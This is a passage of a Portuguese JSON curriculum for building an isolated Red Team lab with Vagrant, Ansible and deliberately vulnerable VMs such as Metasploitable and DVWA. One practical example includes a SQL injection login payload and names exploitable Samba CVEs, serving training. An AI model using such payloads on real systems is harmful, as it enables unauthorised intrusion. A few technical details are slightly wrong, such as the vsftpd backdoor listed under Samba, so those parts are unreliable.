                                    "Vagrant",
                                    "VirtualBox",
                                    "Boxes VagrantHub (ubuntu/focal64)",
                                    "VS Code para edição"
                                  ],
                                  "tips": "Use 'vagrant destroy && vagrant up' para testes rápidos de idempotência.",
                                  "learningObjective": "Criar ambientes virtuais isolados de forma declarativa e reprodutível.",
                                  "commonMistakes": [
                                    "Configurações de rede conflitantes com host",
                                    "Boxes desatualizadas causando falhas",
                                    "Provisioners não idempotentes levando a estados inconsistentes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Ansible para Automação de Configurações",
                                  "subSteps": [
                                    "Instale Ansible e crie estrutura de playbooks: inventory dinâmico via Vagrant.",
                                    "Desenvolva playbooks para cada VM: instalar ferramentas Red Team (Metasploit, Nmap), configurar serviços e hardening.",
                                    "Configure roles Ansible para modularidade: roles para attacker, victim e defender.",
                                    "Integre Ansible no Vagrantfile via provisioner shell ou ansible provisioner.",
                                    "Execute 'vagrant provision' para aplicar configurações e valide com comandos remotos."
                                  ],
                                  "verification": "Playbooks rodam idempotentemente; ferramentas instaladas e serviços rodando em todas VMs.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ansible",
                                    "Coleção Ansible Galaxy para security tools",
                                    "Vagrant com Ansible provisioner"
                                  ],
                                  "tips": "Use facts Ansible para detecção dinâmica de VMs e condições personalizadas.",
                                  "learningObjective": "Automatizar configurações complexas de forma idempotente e escalável.",
                                  "commonMistakes": [
                                    "Inventory hardcoded em vez de dinâmico",
                                    "Tarefas não idempotentes alterando estado múltiplas vezes",
                                    "Falta de handlers para restarts seletivos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar Processo Completo e Validar Reprodutibilidade",
                                  "subSteps": [
                                    "Compile documentação final: README com comandos, variáveis, troubleshooting e diagrama.",
                                    "Crie script wrapper (bash) para deploy one-click: 'deploy.sh' que roda vagrant up/provision.",
                                    "Teste reprodutibilidade: destrua ambiente, rode deploy em máquina limpa e cronometre tempo.",
                                    "Valide isolamento: escaneie rede externa por vazamentos e teste comunicações internas.",
                                    "Versione tudo no Git com tags para releases de topologias."
                                  ],
                                  "verification": "Deploy completo em <5 minutos em nova máquina; documentação permite setup independente.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Git",
                                    "Markdown editor",
                                    "Ambiente de teste limpo (máquina virtual host)"
                                  ],
                                  "tips": "Inclua seção de 'known issues' com soluções para falhas comuns.",
                                  "learningObjective": "Garantir reprodutibilidade total para operações em equipe.",
                                  "commonMistakes": [
                                    "Documentação sem passos exatos de teardown",
                                    "Scripts não portáteis entre OS",
                                    "Falta de testes em hardware diferente"
                                  ]
                                }
                              ],
                              "practicalExample": "Para uma operação Red Team simulando ataque a rede corporativa: Crie Vagrantfile com 3 VMs (attacker: Kali Linux com Metasploit; victim: Ubuntu com web app vulnerável; defender: Windows com SIEM). Ansible instala DVWA na victim, configura firewall isolado. Deploy em 4 minutos, documentado em README para time reproduzir em laptop qualquer.",
                              "finalVerifications": [
                                "Ambiente deployado idempotentemente sem intervenção manual.",
                                "Rede 100% isolada: sem tráfego detectável fora da topologia.",
                                "Tempo de deploy total <5 minutos em hardware padrão.",
                                "Documentação permite setup por colega iniciante sem erros.",
                                "Git repo com histórico completo e tags versionadas.",
                                "Testes de comunicação interna funcionam; externa falha como esperado."
                              ],
                              "assessmentCriteria": [
                                "Completude da documentação: todos comandos, diagramas e vars explicitados (nota 1-10).",
                                "Reprodutibilidade: sucesso em 3 deploys independentes (pass/fail).",
                                "Eficiência: tempo de deploy otimizado e idempotente.",
                                "Isolamento de segurança: validação via Wireshark/nmap externo.",
                                "Modularidade: Ansible roles reutilizáveis em outras topologias.",
                                "Qualidade do código: linting sem erros, boas práticas DevOps."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: IaC com Vagrant/Ansible para CI/CD em segurança.",
                                "Programação: Scripting bash/Python para automação avançada.",
                                "Redes: Conceitos de VLANs e segmentação aplicados virtualmente.",
                                "Gestão de Projetos: Documentação ágil para equipes Red Team.",
                                "Ética em Cibersegurança: Ênfase em isolamento para testes controlados."
                              ],
                              "realWorldApplication": "Em operações Red Team reais, como pentests contratados, esses scripts permitem recriar ambientes de ataque em minutos durante engajamentos, garantindo reprodutibilidade para relatórios, treinamentos e simulações de incidentes em empresas, reduzindo tempo de setup de dias para horas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.3",
                    "name": "Criação de Máquinas Alvo Vulneráveis",
                    "description": "Deploy de VMs com vulnerabilidades conhecidas, como Metasploitable ou DVWA, para testes de ataque.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.3.1",
                        "name": "Seleção e Preparação de Imagens Vulneráveis",
                        "description": "Identificação e download de imagens de máquinas virtuais pré-configuradas com vulnerabilidades conhecidas, como Metasploitable e DVWA, garantindo que sejam adequadas para simulações de ataques em ambientes de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.3.1.1",
                            "name": "Identificar máquinas alvo vulneráveis comuns",
                            "description": "Pesquisar e listar VMs como Metasploitable 2/3 (vulnerável a exploits em serviços como Samba, Apache), DVWA (aplicação web com SQLi, XSS) e outras como VulnHub, explicando suas vulnerabilidades principais para cenários de teste.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender repositórios e fontes de máquinas VM vulneráveis comuns",
                                  "subSteps": [
                                    "Pesquise sites como VulnHub, HackTheBox Academy e Rapid7 para VMs vulneráveis intencionalmente projetadas.",
                                    "Identifique categorias principais: VMs para testes de rede (ex: serviços Samba, FTP), web apps e sistemas operacionais desatualizados.",
                                    "Leia documentações iniciais sobre por que essas VMs são usadas em treinamentos de pentest.",
                                    "Anote licenças e requisitos de hardware (RAM, CPU mínima).",
                                    "Compile uma lista inicial de 5-10 VMs populares."
                                  ],
                                  "verification": "Lista inicial de repositórios e VMs anotada com pelo menos 5 entradas e descrições breves.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Bloco de notas ou ferramenta como Notion/Obsidian",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use buscas específicas como 'vulnerable VMs for pentesting' e priorize VMs gratuitas e ativas.",
                                  "learningObjective": "Compreender fontes confiáveis de VMs vulneráveis para ambientes de teste controlados.",
                                  "commonMistakes": [
                                    "Baixar VMs sem verificar compatibilidade com VirtualBox/VMware.",
                                    "Ignorar avisos de que VMs são para uso educacional apenas.",
                                    "Confundir VMs vulneráveis com imagens de produção."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Metasploitable 2 e 3 como alvos de rede",
                                  "subSteps": [
                                    "Acesse a página oficial do Metasploitable 2/3 no GitHub ou VulnHub e baixe a descrição.",
                                    "Identifique vulnerabilidades principais: Samba (vsftpd backdoor), Apache (mod_dav), IRC, SNMP em Metasploitable 2; Docker e serviços modernos em 3.",
                                    "Liste exploits comuns: use searchsploit para 'metasploitable' e anote CVEs associados.",
                                    "Descreva cenários de teste: enumeração de portas, exploração de serviços desatualizados.",
                                    "Compare Metasploitable 2 (Linux antigo) vs 3 (mais realista)."
                                  ],
                                  "verification": "Relatório com lista de 5+ vulnerabilidades principais e exploits para cada versão.",
                                  "estimatedTime": "25-40 minutos",
                                  "materials": [
                                    "Searchsploit instalado ou site Exploit-DB",
                                    "Documentação Metasploitable",
                                    "Bloco de notas"
                                  ],
                                  "tips": "Não baixe a VM ainda; foque em identificação e análise teórica primeiro.",
                                  "learningObjective": "Reconhecer vulnerabilidades em serviços de rede comuns para simular ataques reais.",
                                  "commonMistakes": [
                                    "Confundir vulnerabilidades com exploits sem contexto CVE.",
                                    "Ignorar que Metasploitable 3 requer mais recursos.",
                                    "Não diferenciar entre versões 2 e 3."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar DVWA e VMs de aplicações web vulneráveis",
                                  "subSteps": [
                                    "Pesquise DVWA (Damn Vulnerable Web Application) no GitHub e leia o README.",
                                    "Liste vulnerabilidades OWASP Top 10: SQL Injection, XSS, CSRF, Command Injection, etc.",
                                    "Identifique outras VMs similares: Mutillidae, WebGoat, Juice Shop.",
                                    "Descreva setup básico: Apache + PHP + MySQL com níveis de segurança ajustáveis.",
                                    "Anote como usá-las para testes de pentest web com Burp Suite ou OWASP ZAP."
                                  ],
                                  "verification": "Tabela comparativa de 4 VMs web com 3-5 vulnerabilidades cada.",
                                  "estimatedTime": "20-35 minutos",
                                  "materials": [
                                    "GitHub",
                                    "OWASP Cheat Sheet",
                                    "Bloco de notas"
                                  ],
                                  "tips": "Busque 'DVWA exploits walkthrough' para exemplos visuais sem executar.",
                                  "learningObjective": "Identificar e categorizar VMs focadas em vulnerabilidades web para cenários de teste.",
                                  "commonMistakes": [
                                    "Executar DVWA sem configurar níveis de segurança corretamente.",
                                    "Ignorar dependências como XAMPP para setup local.",
                                    "Confundir com apps de produção vulneráveis."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compilar lista completa e documentar para cenários de teste",
                                  "subSteps": [
                                    "Reúna todas as VMs identificadas em uma tabela: Nome, Fonte, Vulnerabilidades principais, Uso em Red Team.",
                                    "Adicione VMs extras de VulnHub como Kioptrix, Mr-Robot.",
                                    "Explique matching com ferramentas: Nmap para enumeração, Metasploit para exploits.",
                                    "Priorize por dificuldade: iniciante (DVWA) a avançado (VulnHub boot2root).",
                                    "Crie um plano de uso em jogos cibernéticos."
                                  ],
                                  "verification": "Documento final com 8-10 VMs, vulnerabilidades e cenários listados.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Markdown",
                                    "Referências anteriores"
                                  ],
                                  "tips": "Use categorias como 'Rede', 'Web', 'Sistema' para organização.",
                                  "learningObjective": "Sintetizar conhecimento em uma lista acionável para montagem de labs de teste.",
                                  "commonMistakes": [
                                    "Lista incompleta sem explicações de vulnerabilidades.",
                                    "Não considerar isolamento de rede em labs.",
                                    "Sobrecarregar com VMs obsoletas."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, identifique Metasploitable 2 (vulnerável a Samba usermap_script CVE-2007-2447, exploitable via Metasploit), DVWA (SQLi em login.php, teste com ' OR 1=1 --), e VulnHub 'Kioptrix:1' (Samba trans2open overflow). Liste-as em uma tabela e planeje ataques sequenciais: Nmap > Exploit > Privilege Escalation.",
                              "finalVerifications": [
                                "Pode listar 8+ VMs vulneráveis comuns com fontes corretas.",
                                "Explica pelo menos 3 vulnerabilidades principais por VM com CVEs.",
                                "Diferencia usos: rede vs web vs boot2root.",
                                "Identifica requisitos de setup sem erros comuns.",
                                "Cria tabela organizada para seleção em cenários de teste.",
                                "Menciona ferramentas complementares como Nmap/Metasploit."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de VMs e vulnerabilidades (80%+ corretas).",
                                "Profundidade das explicações (CVEs e exploits citados).",
                                "Organização da lista (categorias, tabela clara).",
                                "Relevância para Red Team (cenários práticos).",
                                "Completude (cobertura de múltiplas categorias).",
                                "Ausência de confusões entre VMs reais e vulneráveis."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Enumeração de portas e serviços vulneráveis.",
                                "Desenvolvimento Web: Entender OWASP Top 10 em apps como DVWA.",
                                "Programação: Scripts de automação para download e setup de VMs.",
                                "Ética e Direito: Uso responsável de VMs em ambientes isolados.",
                                "Análise de Malware: Algumas VMs simulam infecções pós-exploit."
                              ],
                              "realWorldApplication": "Pentesters e Red Teams usam essas VMs para validar exploits em labs isolados antes de autorizações reais (ex: engajamentos de pentest), treinando detecção de vulnerabilidades como Samba em clientes corporativos ou SQLi em apps web, reduzindo riscos em operações cibernéticas."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.1.2",
                            "name": "Baixar imagens de VMs vulneráveis",
                            "description": "Acessar repositórios oficiais como SourceForge para Metasploitable ou GitHub para DVWA, baixar arquivos OVA/OVF ou ISOs, verificar hashes SHA para integridade e armazenar em diretório dedicado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Selecionar Repositórios Oficiais de VMs Vulneráveis",
                                  "subSteps": [
                                    "Pesquise por VMs vulneráveis populares como Metasploitable, DVWA ou VulnHub images usando termos como 'Metasploitable official download'.",
                                    "Identifique repositórios oficiais: SourceForge para Metasploitable, GitHub para DVWA.",
                                    "Verifique a data da última atualização e atividade do repositório para garantir relevância.",
                                    "Liste os formatos disponíveis (OVA, OVF, ISO, ZIP) e selecione o mais compatível com seu hypervisor (ex: VirtualBox, VMware).",
                                    "Anote links diretos de download e hashes SHA se disponíveis na página."
                                  ],
                                  "verification": "Lista anotada com pelo menos 3 repositórios oficiais, links e formatos confirmados em um documento ou bloco de notas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Navegador web (Chrome/Firefox)",
                                    "Bloco de notas ou editor de texto"
                                  ],
                                  "tips": "Priorize repositórios com issues ativas no GitHub ou downloads verificados no SourceForge para evitar fontes maliciosas.",
                                  "learningObjective": "Identificar e validar fontes confiáveis de imagens de VMs vulneráveis para uso em labs de segurança.",
                                  "commonMistakes": [
                                    "Baixar de blogs ou fóruns não oficiais",
                                    "Ignorar verificações de manutenção do repositório",
                                    "Selecionar formatos incompatíveis sem checar hypervisor"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Baixar os Arquivos de VMs Vulneráveis",
                                  "subSteps": [
                                    "Acesse o link oficial selecionado e localize o botão ou link de download direto.",
                                    "Escolha a versão estável mais recente (ex: Metasploitable 2 ZIP para VirtualBox).",
                                    "Inicie o download usando o navegador ou ferramentas CLI como wget/curl para arquivos grandes.",
                                    "Monitore o progresso e pause/resume se necessário para estabilidade.",
                                    "Confirme o tamanho final do arquivo contra a descrição na página de download."
                                  ],
                                  "verification": "Arquivos baixados presentes no diretório de downloads com tamanhos exatos correspondentes aos listados no repositório.",
                                  "estimatedTime": "20-60 minutos (dependendo do tamanho e conexão)",
                                  "materials": [
                                    "Conexão de internet estável (>10Mbps)",
                                    "Espaço em disco livre (mínimo 5GB)",
                                    "Gerenciador de downloads opcional (ex: wget)"
                                  ],
                                  "tips": "Use --continue com wget para retomar downloads interrompidos: wget -c URL.",
                                  "learningObjective": "Executar downloads seguros e completos de grandes imagens de VM sem interrupções ou corrupções.",
                                  "commonMistakes": [
                                    "Iniciar múltiplos downloads simultâneos sobrecarregando a rede",
                                    "Ignorar espaço em disco insuficiente",
                                    "Fechar o navegador prematuramente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar Integridade dos Arquivos com Hashes SHA",
                                  "subSteps": [
                                    "Localize os hashes SHA (SHA1, SHA256) na página de download ou arquivo .sha separado.",
                                    "Baixe o arquivo de checksum se não estiver embutido.",
                                    "Calcule o hash local: sha256sum arquivo.zip no Linux/Mac ou CertUtil -hashfile no Windows.",
                                    "Compare o hash calculado manualmente com o fornecido (case-sensitive).",
                                    "Se não coincidir, delete e rebaixe o arquivo."
                                  ],
                                  "verification": "Relatório escrito confirmando que todos os hashes calculados coincidem 100% com os oficiais.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal/Prompt de comando",
                                    "Ferramentas de hash (sha256sum, shasum, CertUtil)"
                                  ],
                                  "tips": "Automatize com script: echo 'hash_oficial arquivo.zip' | sha256sum --check.",
                                  "learningObjective": "Aplicar verificação criptográfica de integridade para prevenir downloads corrompidos ou maliciosos.",
                                  "commonMistakes": [
                                    "Confundir SHA1 com SHA256",
                                    "Erros de cópia no hash (espaços extras)",
                                    "Pular verificação por 'pressa'"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Armazenar Imagens em Diretório Dedicado e Documentar",
                                  "subSteps": [
                                    "Crie um diretório dedicado: mkdir -p ~/cyber-range/vulnerable-vms/metasploitable.",
                                    "Mova os arquivos baixados para o diretório usando mv ou explorer.",
                                    "Renomeie arquivos para incluir versão: metasploitable-2.0.0.zip.",
                                    "Crie um README.md com fonte, link, hash SHA, data de download e hypervisor compatível.",
                                    "Defina permissões: chmod 644 *.zip para leitura segura."
                                  ],
                                  "verification": "Diretório criado com arquivos organizados, README completo e acesso verificado.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Terminal ou gerenciador de arquivos",
                                    "Editor de texto (VS Code, nano)"
                                  ],
                                  "tips": "Use estrutura de pastas por VM: ~/cyber-range/targets/[nome-vm]/ para escalabilidade.",
                                  "learningObjective": "Organizar recursos de lab cibernético de forma profissional e replicável.",
                                  "commonMistakes": [
                                    "Deixar arquivos no Downloads bagunçado",
                                    "Esquecer documentação de hashes/fonte",
                                    "Permissões excessivas (777)"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe Metasploitable 2 do SourceForge (https://sourceforge.net/projects/metasploitable/files/Metasploitable2/), selecione metasploitable-linux-2.0.0.zip (SHA1: 9b543a65b99a278b18bf327e415e328d3ff69220), verifique com sha1sum, e armazene em ~/cyber-range/targets/metasploitable2/ com README.",
                              "finalVerifications": [
                                "Todos os arquivos foram baixados completamente sem erros.",
                                "Hashes SHA calculados coincidem exatamente com os oficiais.",
                                "Arquivos movidos para diretório dedicado com estrutura organizada.",
                                "README criado com metadados completos (fonte, hash, data).",
                                "Sem indícios de corrupção ou malware (tamanhos/hashes corretos).",
                                "Permissões de arquivos configuradas corretamente para uso seguro."
                              ],
                              "assessmentCriteria": [
                                "Identificação precisa de pelo menos 2 repositórios oficiais.",
                                "Downloads concluídos com 100% de integridade via hash verification.",
                                "Organização em diretório dedicado com documentação completa.",
                                "Tempo total dentro de 1 hora, demonstrando eficiência.",
                                "Ausência de erros comuns como fontes não oficiais ou hashes ignorados.",
                                "Uso correto de ferramentas CLI onde aplicável."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de distribuição de arquivos via HTTP/FTP em repositórios.",
                                "Programação: Automação de downloads e verificações com scripts Bash/Python.",
                                "Sistemas Operacionais: Manipulação de arquivos, permissões e terminal.",
                                "Criptografia: Conceitos de hashes para integridade de dados.",
                                "Gestão de Projetos: Organização de assets para labs colaborativos."
                              ],
                              "realWorldApplication": "Em cenários de Red Team e pentests profissionais, baixar e verificar VMs vulneráveis como Metasploitable garante labs isolados seguros para simular ataques reais, evitando malware acidental e permitindo treinamentos em CTFs, certificações como OSCP e operações cibernéticas éticas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.1.1"
                            ]
                          },
                          {
                            "id": "10.1.7.3.1.3",
                            "name": "Verificar compatibilidade das imagens",
                            "description": "Analisar requisitos de hardware (RAM, CPU) das VMs e compatibilidade com hypervisors como VirtualBox ou VMware, ajustando configurações iniciais para evitar falhas no deploy.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Requisitos da Imagem VM",
                                  "subSteps": [
                                    "Baixar ou acessar a documentação da imagem VM (ex: OVA/OVF ou README).",
                                    "Extrair specs mínimas: RAM, CPU cores, disco, SO base e dependências.",
                                    "Listar hypervisors suportados explicitamente (VirtualBox, VMware, etc.).",
                                    "Verificar versão da imagem e patches conhecidos de compatibilidade.",
                                    "Registrar requisitos em uma planilha ou ferramenta de tracking."
                                  ],
                                  "verification": "Criar um relatório resumido com todos os requisitos extraídos e confirmados contra fontes oficiais.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Documentação da imagem VM, planilha (Google Sheets/Excel), hypervisor docs oficiais.",
                                  "tips": "Sempre priorize fontes oficiais do fornecedor da imagem para evitar specs desatualizadas.",
                                  "learningObjective": "Compreender e extrair precisamente os requisitos técnicos de uma imagem VM vulnerável.",
                                  "commonMistakes": "Ignorar requisitos de rede ou GPU; assumir compatibilidade sem checar docs."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar Especificações do Hardware Host",
                                  "subSteps": [
                                    "Executar ferramentas de diagnóstico: Task Manager (Windows), htop/top (Linux), Activity Monitor (Mac).",
                                    "Verificar RAM total disponível, CPU model/cores/clock speed e espaço em disco livre.",
                                    "Identificar hypervisor instalado e sua versão (ex: VirtualBox 7.x).",
                                    "Checar drivers de virtualização (VT-x/AMD-V ativados no BIOS/UEFI).",
                                    "Calcular overhead: subtrair 20-30% para SO host e outras VMs."
                                  ],
                                  "verification": "Gerar um relatório de hardware com specs exatas e comparação visual (gráficos ou tabela).",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": "Ferramentas de system info (CPU-Z, Speccy), acesso BIOS/UEFI, hypervisor installer.",
                                  "tips": "Use comandos como 'VBoxManage list hostinfo' no VirtualBox para info detalhada.",
                                  "learningObjective": "Mapear capacidades reais do hardware host para suportar múltiplas VMs em cenários de lab.",
                                  "commonMistakes": "Esquecer de considerar overhead do host; não verificar virtualização habilitada."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Compatibilidade com Hypervisor",
                                  "subSteps": [
                                    "Comparar specs VM vs host usando matriz de compatibilidade (RAM VM <= 80% host, etc.).",
                                    "Testar importação da imagem no hypervisor sem alocações totais.",
                                    "Verificar logs de erro durante import/preview (ex: VBox.log).",
                                    "Consultar matriz de compatibilidade oficial do hypervisor para SOs/imagens.",
                                    "Identificar gaps: upgradar hypervisor ou ajustar VM se necessário."
                                  ],
                                  "verification": "Documentar matriz de compatibilidade com status (verde/amarelo/vermelho) para cada requisito.",
                                  "estimatedTime": "25-40 minutos",
                                  "materials": "Hypervisor instalado (VirtualBox/VMware), imagens OVA teste, logs de console.",
                                  "tips": "Inicie com configurações mínimas para testes rápidos de compatibilidade.",
                                  "learningObjective": "Aplicar análise comparativa para prever e mitigar falhas de deploy de VMs.",
                                  "commonMistakes": "Não checar logs detalhados; ignorar incompatibilidades de driver de rede."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustar Configurações e Validar Deploy Inicial",
                                  "subSteps": [
                                    "Reduzir alocações VM se host insuficiente (ex: RAM de 4GB para 2GB).",
                                    "Configurar rede bridged/NAT conforme lab cibernético e testar conectividade.",
                                    "Importar e bootar VM em modo headless/teste, monitorando uso de recursos.",
                                    "Aplicar snapshots iniciais para rollback rápido.",
                                    "Executar script de validação básica (ping, nmap scan inicial)."
                                  ],
                                  "verification": "VM boots sem crashes, responde a pings e consome <80% recursos host por 10min.",
                                  "estimatedTime": "20-35 minutos",
                                  "materials": "Hypervisor GUI/CLI, scripts de teste (bash/PowerShell), monitoring tools (htop).",
                                  "tips": "Sempre crie snapshot 'base-compatible' antes de alterações maiores.",
                                  "learningObjective": "Otimizar configurações VM para estabilidade em ambientes de simulação de ataques.",
                                  "commonMistakes": "Overprovisioning de recursos levando a freezes; esquecer snapshots."
                                }
                              ],
                              "practicalExample": "Ao preparar um lab para Red Team com imagem Metasploitable 3 (req: 2GB RAM, 2 cores), no laptop com 16GB RAM/i7/VirtualBox 7.0: Step1 extrai specs OVA; Step2 confirma 12GB livres; Step3 matriz verde; Step4 ajusta RAM para 1.5GB, boots com sucesso e snapshot criado.",
                              "finalVerifications": [
                                "Todas imagens importam sem erros de compatibilidade.",
                                "VMs bootam e rodam por 15min sem crashes ou alto uso de CPU (>90%).",
                                "Rede interna/externa funcional (ping/nmap testes passem).",
                                "Snapshots iniciais criados para cada VM.",
                                "Relatório de compatibilidade documentado com métricas.",
                                "Recursos host <70% em idle com VMs rodando."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração de requisitos VM (100% match com docs).",
                                "Análise de hardware completa e realista (inclui overhead).",
                                "Matriz de compatibilidade lógica e sem gaps identificados incorretamente.",
                                "Ajustes eficazes: zero falhas no deploy final.",
                                "Documentação clara com verificações e logs.",
                                "Eficiência temporal: dentro de estimados totais."
                              ],
                              "crossCurricularConnections": [
                                "Hardware e Arquitetura de Computadores: Entender impacto de CPU/RAM em virtualização.",
                                "Redes: Configurações de rede VM para simulações de ataques.",
                                "Programação/Scripting: Automatizar checagens com VBoxManage ou PowerCLI.",
                                "Gestão de Projetos: Tracking de requisitos em labs complexos."
                              ],
                              "realWorldApplication": "Em operações Red Team reais, como CTF ou pentests, verificar compatibilidade garante labs estáveis para simular ataques persistentes sem downtime, permitindo foco em exploração de vulnerabilidades em ambientes vulneráveis como DVWA ou VulnHub VMs."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.3.2",
                        "name": "Configuração do Ambiente de Virtualização",
                        "description": "Instalação e configuração de software de virtualização para hospedar as VMs alvo, incluindo rede isolada para simular ambientes de jogos cibernéticos sem riscos reais.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.3.2.1",
                            "name": "Instalar hypervisor gratuito",
                            "description": "Instalar VirtualBox ou VMware Workstation Player, configurar rede em modo 'Host-Only' ou 'Internal Network' para isolar tráfego de VMs alvo do host e rede externa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Baixar o Hypervisor Gratuito",
                                  "subSteps": [
                                    "Pesquise e compare VirtualBox (Oracle) e VMware Workstation Player (Broadcom) em seus sites oficiais.",
                                    "Verifique compatibilidade com seu SO host (Windows, Linux ou macOS).",
                                    "Baixe a versão mais recente do hypervisor escolhido de fontes oficiais.",
                                    "Verifique a integridade do arquivo baixado usando hash SHA256 fornecido no site.",
                                    "Salve o instalador em uma pasta dedicada, como 'C:\\HypervisorInstall'."
                                  ],
                                  "verification": "Arquivo baixado com hash correspondente e pronto para instalação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Conexão à internet",
                                    "Calculadora de hash (ex: certutil no Windows)"
                                  ],
                                  "tips": "Prefira VirtualBox para simplicidade em iniciantes; VMware para melhor performance em hardware moderno.",
                                  "learningObjective": "Entender critérios de seleção de hypervisors e validar downloads seguros.",
                                  "commonMistakes": [
                                    "Baixar de sites não oficiais (risco de malware)",
                                    "Ignorar verificação de hash",
                                    "Escolher versão incompatível com SO host"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar o Hypervisor no Sistema Host",
                                  "subSteps": [
                                    "Execute o instalador como administrador.",
                                    "Siga o assistente de instalação, aceitando padrões exceto quando indicado.",
                                    "Instale componentes opcionais como USB support e Network adapters.",
                                    "Reinicie o sistema se solicitado.",
                                    "Abra o hypervisor e confirme que a interface principal carrega sem erros."
                                  ],
                                  "verification": "Hypervisor abre corretamente e lista opções de nova VM.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Instalador baixado",
                                    "Privilégios de administrador"
                                  ],
                                  "tips": "Desative antivírus temporariamente se bloquear a instalação de drivers de rede.",
                                  "learningObjective": "Realizar instalação limpa e funcional de hypervisor.",
                                  "commonMistakes": [
                                    "Não executar como admin",
                                    "Pular reinicialização",
                                    "Conflitos com antivírus/hypervisors existentes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Adaptador de Rede Isolado",
                                  "subSteps": [
                                    "No VirtualBox: Vá em File > Host Network Manager > Create (Host-Only). No VMware: Edit > Virtual Network Editor > Add Network > Host-only.",
                                    "Configure o adaptador: DHCP desabilitado, subnet como 192.168.56.0/24.",
                                    "Defina gateway como 192.168.56.1 e habilite isolamento (sem bridge/NAT).",
                                    "Salve e verifique se o adaptador aparece na lista de redes do host.",
                                    "Teste conectividade local no host pingando o gateway."
                                  ],
                                  "verification": "Adaptador Host-Only/Internal criado e visível nas configurações de rede do hypervisor.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Hypervisor instalado"
                                  ],
                                  "tips": "Use 'Internal Network' no VMware para total isolamento sem visibilidade no host.",
                                  "learningObjective": "Configurar redes virtuais isoladas para simular ambientes de teste seguros.",
                                  "commonMistakes": [
                                    "Configurar NAT/Bridged por engano (expõe VMs)",
                                    "Conflito de IP com rede host",
                                    "Não desabilitar DHCP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar VM Alvo e Verificar Isolamento",
                                  "subSteps": [
                                    "Crie nova VM: Aloque 2GB RAM, 20GB disco, ISO de SO vulnerável (ex: Metasploitable).",
                                    "Na configuração de rede da VM, selecione o adaptador Host-Only/Internal criado.",
                                    "Inicie a VM e instale/inicie o SO alvo.",
                                    "Do host, tente pingar a VM (deve falhar se Internal; succeed se Host-Only).",
                                    "Da VM, tente acessar internet (deve falhar), confirmando isolamento."
                                  ],
                                  "verification": "VM roda isolada: sem saída para rede externa, tráfego confinado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ISO de SO vulnerável",
                                    "Hypervisor configurado"
                                  ],
                                  "tips": "Use snapshots antes de instalar SO para fácil reset em jogos de guerra.",
                                  "learningObjective": "Integrar rede isolada em VM para labs de Red Team seguros.",
                                  "commonMistakes": [
                                    "Selecionar rede errada na VM",
                                    "Esquecer de iniciar adaptador",
                                    "Não testar isolamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Instale VirtualBox no Windows 11, crie rede Host-Only 192.168.56.0/24, adicione VM com Ubuntu vulnerável (ISO antigo), configure NIC1 como Host-Only. Inicie VM, instale nmap nela; do host, não pingue VM externa, mas VMs no mesmo adaptador se comuniquem apenas entre si.",
                              "finalVerifications": [
                                "Hypervisor instalado e funcional sem crashes.",
                                "Rede Host-Only/Internal criada e ativa.",
                                "VM alvo inicia com SO bootado.",
